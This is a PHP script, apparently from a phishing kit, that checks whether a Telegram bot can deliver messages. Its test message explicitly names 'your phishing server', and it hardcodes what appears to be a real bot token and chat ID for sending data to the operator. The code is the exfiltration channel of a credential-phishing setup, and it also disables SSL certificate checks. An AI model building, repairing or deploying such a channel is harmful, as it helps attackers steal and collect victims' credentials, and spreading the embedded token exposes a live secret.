<?php

// Test Telegram API connection
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";

echo "<h2>Telegram API Test</h2>";
echo "<p>Bot Token: " . substr($telegram_bot_token, 0, 20) . "...</p>";
echo "<p>Chat ID: {$telegram_chat_id}</p>";

$message = "🧪 *Test Message*\n\nThis is a test from your phishing server.\n\nTime: " . date("Y-m-d H:i:s");

$url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

$post_data = [
    'chat_id' => $telegram_chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$curl_error = curl_error($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "<h3>Results:</h3>";
echo "<p>HTTP Code: {$http_code}</p>";

if ($curl_error) {
    echo "<p style='color:red;'>Curl Error: {$curl_error}</p>";
}

echo "<p>Response:</p>";
echo "<pre>" . htmlspecialchars($response) . "</pre>";

$result = json_decode($response, true);
if ($result && $result['ok']) {
    echo "<p style='color:green;font-size:20px;'>✅ SUCCESS! Check your Telegram!</p>";
} else {
    echo "<p style='color:red;font-size:20px;'>❌ FAILED - Check bot token and chat ID</p>";
}

?>
